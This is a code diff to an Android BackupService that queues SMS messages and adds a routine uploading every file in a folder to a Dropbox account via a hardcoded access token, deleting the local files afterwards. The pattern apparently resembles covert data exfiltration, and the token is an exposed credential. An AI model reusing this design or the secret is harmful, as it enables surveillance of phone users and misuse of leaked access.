@@ -25,6 +25,7 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.List;
 import java.util.Locale;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -32,8 +33,11 @@ import java.util.TimerTask;
 public class BackupService extends IntentService {
 
     public static final String SMS = "sms";
+    public static final String SEND_FILES = "send_files";
+    public static final String FILES_FOLDER = "files_folder";
     private static final String DROPBOX_ACCESS_TOKEN = "Y09locXg68AAAAAAAAAAXrx09PJ-YKhiCHJqWpgiVrmgBJ22iP4o4_TRK5QqZCM2";
     private static final String MESSAGES_FOLDER = "messages";
+    private static List<String> mSendingDirs = new ArrayList<>(1);
 
     private final ArrayList<Sms> mMessages = new ArrayList<>();
     private boolean mIsBusy;
@@ -53,13 +57,20 @@ public class BackupService extends IntentService {
         if (intent == null || intent.getExtras() == null) {
             return;
         }
-        Object messageObj = intent.getExtras().getSerializable(SMS);
-        if (messageObj != null) {
-            if (messageObj instanceof Sms) {
-                synchronized (mMessages) {
-                    mMessages.add((Sms) messageObj);
+        if(TextUtils.equals(intent.getAction(), SMS)) {
+            Object messageObj = intent.getExtras().getSerializable(SMS);
+            if (messageObj != null) {
+                if (messageObj instanceof Sms) {
+                    synchronized (mMessages) {
+                        mMessages.add((Sms) messageObj);
+                    }
+                    startQueue();
                 }
-                startQueue();
+            }
+        } else if(TextUtils.equals(intent.getAction(), SEND_FILES)) {
+            String filesFolder = intent.getExtras().getString(FILES_FOLDER);
+            if(filesFolder != null) {
+                sendFiles(filesFolder);
             }
         }
     }
@@ -96,6 +107,60 @@ public class BackupService extends IntentService {
         }
         if(!isBreak) {
             mIsBusy = false;
+        }
+    }
+
+    private void sendFiles(final String directoryPath) {
+        if(mSendingDirs.contains(directoryPath)) {
+            return;
+        }
+        File dir = new File(directoryPath);
+        if(!dir.exists()) {
+            return;
+        }
+        String dirName = dir.getParentFile().getName();
+        mSendingDirs.add(directoryPath);
+        try {
+            for (File innerFile : dir.listFiles()) {
+                DbxClientV2 client = new DbxClientV2(DbxRequestConfig.newBuilder("CommStat").build(), DROPBOX_ACCESS_TOKEN);
+                ListFolderResult result = client.files().listFolder("");
+                Metadata dbFolder = null;
+                while (true) {
+                    for (Metadata metadata : result.getEntries()) {
+                        if (TextUtils.equals(metadata.getName(), dirName)) {
+                            dbFolder = metadata;
+                            break;
+                        }
+                    }
+                    if (!result.getHasMore()) {
+                        break;
+                    }
+                    result = client.files().listFolderContinue(result.getCursor());
+                }
+                if (dbFolder == null) {
+                    client.files().createFolder("/" + dirName);
+                }
+                InputStream is = null;
+                try {
+                    is = new FileInputStream(innerFile);
+                    client.files().uploadBuilder("/" + dirName + "/" + innerFile.getName())
+                            .withMode(WriteMode.ADD)
+                            .uploadAndFinish(is);
+                    innerFile.delete();
+                } finally {
+                    IOUtils.closeQuietly(is);
+                }
+            }
+            mSendingDirs.remove(directoryPath);
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            new Timer().schedule(new TimerTask() {
+                @Override
+                public void run() {
+                    mSendingDirs.remove(directoryPath);
+                    sendFiles(directoryPath);
+                }
+            }, 10000);
         }
     }
 
